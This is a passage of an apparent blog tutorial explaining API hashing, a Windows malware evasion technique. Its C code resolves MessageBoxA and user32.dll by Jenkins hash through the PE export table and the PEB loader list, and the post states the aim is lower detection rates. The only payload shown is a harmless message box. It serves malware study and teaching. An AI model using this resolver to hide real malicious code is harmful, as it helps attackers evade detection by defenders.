[{"content":"Intro As mentioned in the Exploring PEB struct and its fields post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value. This way, direct calls by function names is avoided and thus leads to fewer detection rates.\nHow it works A hash function is applied to the API function name. For example, a simple hash function might take the string CreateFileA and produce a hash value such as 0xA1B2C3D4.\nRuntime Resolution When the program runs, it will compare the hash values of available API functions with the precomputed hash values. When a match is found, the corresponding function is called, thus avoiding the direct call (hardcoded use) of the name.\nIn the following code that will be showcased, we will break down how to find all the functions inside a given DLL and loop through them until we get a hit for a hash value comparison. The hash we will be comparing with will be that of the MessageBoxA, and when the match will be found, we will call this function.\nCode We will explain one part at a time, slowly building up the code that will execute a MessageBoxA function without using the direct name.\nChecking for DLL argument The executable will take as argument the DLL that we want the MessageBoxA function from, and specifically the user32.dll. So our code starts by checking if an argument has been given and if so, it stores it in a variable:\nint main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; /* -- more -- */ } Loading the DLL in memory After the Dll argument has been given, we check with GetModuleHandleA if the DLL is already loaded in memory. If not, GetModuleHandleA will have returned NULL and so we will use LoadLibraryA to load this DLL in memory:\nint main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Get a handle for this dll HMODULE hModule_of_arg_dll = GetModuleHandleA((LPCSTR)targetDllName); // If it is not loaded in memory, load it now if (hModule_of_arg_dll == NULL) { hModule_of_arg_dll = LoadLibraryA(targetDllName); } } We cast the targetDllName to (LPCSTR) since the GetModuleHandleA accepts this type of parameter:\nGetModuleHandleA( _In_opt_ LPCSTR lpModuleName ); We can always CTRL+click on the function\u0026rsquo;s name to see its definition and type parameters.\nAPI Hashing - Finding the function via hash Now this is the part of the juicy code that enumerates through all the DLL\u0026rsquo;s functions and searches for a hash match. In this code, we pre-computed the hash value of the MessageBoxA function of user32.dll. So we basically pass the user32.dll as parameter to the program, and then program tries to find a match of a function inside user32.dll whose hash is the same as the precomputed hardcoded one we compare with.\nLet\u0026rsquo;s start analyzing. We first call the GetProcAddressH which is a custom function that passes as arguments the handle of the previously loaded DLL, and the hash of the MessageBoxA (MessageBoxA_HASH) we precomputed:\n#define MessageBoxA_HASH 0xF10E27CA typedef int (*PfnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); int main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Get a handle for this dll HMODULE hModule_of_arg_dll = GetModuleHandleA((LPCSTR)targetDllName); // If it is not loaded in memory, load it now if (hModule_of_arg_dll == NULL) { hModule_of_arg_dll = LoadLibraryA(targetDllName); } // Getting the address of MessageBoxA function using GetProcAddressH PfnMessageBoxA pMessageBoxA = (PfnMessageBoxA)GetProcAddressH(hModule_of_arg_dll, MessageBoxA_HASH); if (pMessageBoxA == NULL) { printf(\u0026#34;[!] Couldn\u0026#39;t Find Address Of Specified Function \\n\u0026#34;); return -1; } We also cast to PfnMessageBoxA. This is because our GetProcAddressH as we will see shortly returns a pointer to the address of the matching hashed function. So since we get back a pointer to an address, we cast to the corresponding type of data this address contains, which is of fnMessageBoxA type.\nOne side note here is that the PfnMessageBoxA is not the actual MessageBox. The actual MessageBox has the following struct:\nint MessageBox( [in, optional] HWND hWnd, [in, optional] LPCTSTR lpText, [in, optional] LPCTSTR lpCaption, [in] UINT uType ); so we just defined our own same data struct.\nHash function Before we finally dive into the GetProcAddressH to see the process of API Hashing, let\u0026rsquo;s see the hash function that will be used first:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define INITIAL_SEED\t7\t// Generate JenkinsOneAtATime32Bit hashes from Ascii input string UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) { SIZE_T Index = 0; UINT32 Hash = 0; SIZE_T Length = lstrlenA(String); while (Index != Length) { Hash += String[Index++]; Hash += Hash \u0026lt;\u0026lt; INITIAL_SEED; Hash ^= Hash \u0026gt;\u0026gt; 6; } Hash += Hash \u0026lt;\u0026lt; 3; Hash ^= Hash \u0026gt;\u0026gt; 11; Hash += Hash \u0026lt;\u0026lt; 15; return Hash; } #define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API)) This is just one hash function that can be used. It was taken from the VX Underground repo. You could use whatever function you want.\nWe also define a shorter name for this function, HASHA, which takes as a parameter the API (the function) that the code will hash. We also cast the parameter (API) to (PCHAR) since the HashStringJenkinsOneAtATime32BitA takes as a parameter a (PCHAR) string.\nGetProcAddressH - Load, Hash, Compare, Repeat The code responsible for loading the functions of the given dll, hashing them and comparing with the hardcoded precomputed value, is the following:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; } This code, besides the hashing part, mostly does checks on the PE fields to make sure everything is correct before continuing. This is usually what malwares do to make sure they will definitely run on the victim\u0026rsquo;s machine and would ideally not want to risk running on some error on runtime.\nWe can break down the checks and make a short introductory on loading a PE file on memory, but a more in depth post will be posted in the future regarding this.\nTo begin with, we make sure that neither the handle to the DLL\u0026rsquo;s address nor the Hash of the target function that are passed as parameters are null:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; /* -- more -- */ } Continuing on, we cast the pBase (Which is just the handle to the address of the DLL) to PIMAGE_DOS_HEADER:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; /* -- more -- */ } Why? Well, the handle just currently points to a memory address. This memory address contains the bytes of the DLL. These bytes are not just \u0026ldquo;bytes\u0026rdquo; but they represent fields of a struct - specifically that of an IMAGE_DOS_HEADER, since DLL\u0026rsquo;s such as EXE start with this struct.\nIn other words, the address where the pBase has is the memory address of a series of bytes, that when casted to PIMAGE_DOS_HEADER (since this is the appropriate starting struct for a DLL) gives us access to its fields:\nThis cast to PIMAGE_DOS_HEADER which is the top header of the DLL gives us all we need to calculate the addresses of the rest of the headers, as we will see shortly.\nThe code, after casting to the appropriate data structure, checks if the e_magic is equal to IMAGE_DOS_SIGNATURE. The IMAGE_DOS_SIGNATURE is actually MZ, and thus, the e_magic is always MZ for an executable/dll file. The full struct of IMAGE_DOS_HEADER that contains this field is the following:\ntypedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; After the validation for the MZ header, we use the pBase (the base address of our dll) in combination with a field of the IMAGE_DOS_HEADER struct to calculate the VA (Virtual Address) of the IMAGE_NT_HEADERS struct, which is the third header seen in the previous image (\u0026lsquo;NT Headers\u0026rsquo;):\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; /* -- more -- */ } The field used here from the IMAGE_DOS_HEADER is the e_lfanew field, which is also known as RVA (Relative Virtual Address). Basically the relationship between the base address, RVA and VA goes as the following:\nBase address: This is an address in memory that acts as the starting point. It simply is where something initially was saved at. Here our DLL was loaded at an address which we have stored in our pBase variable. RVA: Relative Virtual Address is like an offset of some field of our DLL. Basically, the DLL contains many stucts and instead of storing the address of each one, we just use the base address of our DLL (where it starts) and an offset, which is how far away is from the starting point (baseAddress). VA: Virtual Address is the actual address (starting point) of the field/struct we want to land on. In summary: baseAddress + RVA[something] = VA[something]\nSo, here the e_lfanew is the offset of the DLL\u0026rsquo;s base address to the NT_HEADER struct. By adding the base address of our DLL with this field, we get the VA (actual address) of the NT_HEADER struct that we can now cast to the corresponding type and gain access to its fields.\nThe struct of the IMAGE_NT_HEADERS is the following:\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; The Signature we are doing the check with is actually the \u0026lsquo;PE\u0026rsquo; that executables and DLL\u0026rsquo;s have. This is just another check the program does before proceeding forward with the API Hashing.\nMoving further, it is now time to finally get the function names, their addresses and their ordinals (integer numbers representing the functions):\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); /* -- more -- */ The code continues with using the ImgOptHdr we previously calculated in order to load the necessary fields and structs that contain the information we are aiming for. But what is the ImgOptHdr and what useful info does it contain?\nIt\u0026rsquo;s struct is the following (IMAGE_OPTIONAL_HEADER):\ntypedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; In the code we utilized the DataDirectory table field and specifically the index named \u0026lsquo;IMAGE_DIRECTORY_ENTRY_EXPORT\u0026rsquo;. Taking a look at what the IMAGE_DATA_DIRECTORY struct contains, we see the following:\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; So basically the DataDirectory field is a table that contains structs with fields a VirtualAddress and Size. In our code we used the index IMAGE_DIRECTORY_ENTRY_EXPORT and that led us to a _IMAGE_DATA_DIRECTORY with a VirtualAddress - since this is what we are taking with the \u0026lsquo;-\u0026gt;\u0026rsquo; symbol - and Size. But why we used the specific index and why does this can be casted back to IMAGE_EXPORT_DIRECTORY?\nWe simply CTRL+click onto the index and see the following:\n// Directory Entries #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor So the IMAGE_DIRECTORY_ENTRY_EXPORT is equal to 0 (the first entry) and it basically points to the Export directory. Awesome! That is the reason we cast the result back to IMAGE_EXPORT_DIRECTORY.\nTaking a look at the IMAGE_EXPORT_DIRECTORY struct, we see the following fields:\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image }; As the comments explain, the AddressOfFunctinos, AddressOfNames and AddressOfNameOrdinals are RVA\u0026rsquo;s from the base address. So this is why we once again use pBase plus these to get the VA (the actual address) of these fields.\nFinally, we loop through the function names and ordinals of each function, hash each one and compare with our target hash:\nFARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; Things to note here is that the VA of FunctionNameArray and FunctionAddressArray are arrays that contain RVA\u0026rsquo;s, so that\u0026rsquo;s why we again use pBase for the calculations of the actual addresses.\nFinally, we use the hashing of the function\u0026rsquo;s name and comparisson with the target hash.\nThe full code is the following:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define INITIAL_SEED\t7\t// Generate JenkinsOneAtATime32Bit hashes from Ascii input string UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) { SIZE_T Index = 0; UINT32 Hash = 0; SIZE_T Length = lstrlenA(String); while (Index != Length) { Hash += String[Index++]; Hash += Hash \u0026lt;\u0026lt; INITIAL_SEED; Hash ^= Hash \u0026gt;\u0026gt; 6; } Hash += Hash \u0026lt;\u0026lt; 3; Hash ^= Hash \u0026gt;\u0026gt; 11; Hash += Hash \u0026lt;\u0026lt; 15; return Hash; } #define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API)) #define MessageBoxA_HASH 0xF10E27CA typedef int (*PfnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; } int main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Get a handle for this dll HMODULE hModule_of_arg_dll = GetModuleHandleA((LPCSTR)targetDllName); // If it is not loaded in memory, load it now if (hModule_of_arg_dll == NULL) { hModule_of_arg_dll = LoadLibraryA(targetDllName); } // Getting the address of MessageBoxA function using GetProcAddressH PfnMessageBoxA pMessageBoxA = (PfnMessageBoxA)GetProcAddressH(hModule_of_arg_dll, MessageBoxA_HASH); if (pMessageBoxA == NULL) { printf(\u0026#34;[!] Couldn\u0026#39;t Find Address Of Specified Function \\n\u0026#34;); return -1; } // Calling MessageBoxA pMessageBoxA(NULL, \u0026#34;Avoiding names - executing functions\u0026#34;, \u0026#34;:)\u0026#34;, MB_OK | MB_ICONEXCLAMATION); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Quit ... \u0026#34;); getchar(); return 0; } and the result upon execution is:\nAPI Hashing - Finding the DLL via hash In the previous code we saw how to load a function via its hash, while giving the name of the dll name we want to use. But what about using the same technique for the dll name itself?\nWell, that is exactly what we are going to do. We will a hash both for the DLL name but also with a function within it (just as previously).\nCode additions Utilizing our previous code, we need to do some small aditions:\nSpecify the Hash value for \u0026ldquo;USER32.DLL\u0026rdquo; hash that we will be comparing with. Make the necessary checks to see if this dll is loaded to memory before proceeding. Create our own CreateModuleHandleH function to return a Handle to the specified DLL. The way it will find the DLL will be using API Hashing, as previously. Specifying the Hash The only line we need for this is the following:\n#define USER32DLL_HASH 0x81E3778E Check if USER32.DLL is loaded A check we need to do before proceeding is to see if the DLL is loaded and load it to memory. If an error occurs, we stop the execution:\nif (LoadLibraryA((LPCSTR)targetDllName) == NULL) { printf(\u0026#34;Failed to load target dll with error %d. Exiting...\u0026#34;, GetLastError()); return 0; } GetModuleHandleH Now comes the custom function that will take care of the API Hashing for the DLL name. The full code is:\ntypedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; // this is the ldr module. Basically it refers to the information of a dll entry to ldr_module_table typedef struct _LDR_MODULE_full { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE_full, * PLDR_MODULE_full; HMODULE GetModuleHandleH(DWORD dwModuleNameHash) { #ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); char dllName[256]; snprintf(dllName, sizeof(dllName), \u0026#34;%wZ\u0026#34;, pLdrModule-\u0026gt;BaseDllName); printf(\u0026#34;HASH: 0x%x \\n\u0026#34;, HASHA((PCHAR)dllName)); if ( HASHA(dllName) == dwModuleNameHash) { wprintf(L\u0026#34;Target DLL %wZ found at BaseAddress: %p\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName, pLdrModule-\u0026gt;BaseAddress); return pLdrModule-\u0026gt;BaseAddress; // Exit the program once the target DLL is found } // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } wprintf(L\u0026#34;Target DLL with hash %s not found\\n\u0026#34;, dwModuleNameHash); return 1; } Most of this code has already been shown and explained in the Exploring PEB struct and its fields post. We will explain only the new additions.\nFirst off, we get the current LDR_MODULE and print its hash value:\nchar dllName[256]; snprintf(dllName, sizeof(dllName), \u0026#34;%wZ\u0026#34;, pLdrModule-\u0026gt;BaseDllName); printf(\u0026#34;HASH: 0x%x \\n\u0026#34;, HASHA((PCHAR)dllName)); We use snprintf to format a unicode string (%wZ) - specifically the pLdrModule-\u0026gt;BaseDllName - to a char* type. What we do is declare a buffer and copy the UNICODE_STRING that has been converted to char* into that buffer.\nThen we simply hash that dllName we just got from the Unicode convertion of the BaseDllName, and compare it with the parameter given to the function, which is the USER32.DLL hash. If there is a match, we return its BaseAddress (the address that this DLL is loaded in memory).\nSo the whole idea of this function GetModuleHandleH is to loop over all the loaded DLL\u0026rsquo;s from the LDR_MODULE, hash and compare each one to the target hash.\nThe full code for hashing both the Dll and the target function is the following:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #define INITIAL_SEED\t7\t// Generate JenkinsOneAtATime32Bit hashes from Ascii input string UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) { SIZE_T Index = 0; UINT32 Hash = 0; SIZE_T Length = lstrlenA(String); while (Index != Length) { Hash += String[Index++]; Hash += Hash \u0026lt;\u0026lt; INITIAL_SEED; Hash ^= Hash \u0026gt;\u0026gt; 6; } Hash += Hash \u0026lt;\u0026lt; 3; Hash ^= Hash \u0026gt;\u0026gt; 11; Hash += Hash \u0026lt;\u0026lt; 15; return Hash; } #define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API)) #define USER32DLL_HASH 0x81E3778E #define MessageBoxA_HASH 0xF10E27CA typedef int (*PfnMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // this is the ldr struct typedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; // this is the ldr module. Basically it refers to the information of a dll entry to ldr_module_table typedef struct _LDR_MODULE_full { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE_full, * PLDR_MODULE_full; FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) { if (hModule == NULL || dwApiNameHash == NULL) return NULL; PBYTE pBase = (PBYTE)hModule; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PVOID\tpFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); // Hashing every function name pFunctionName // If both hashes are 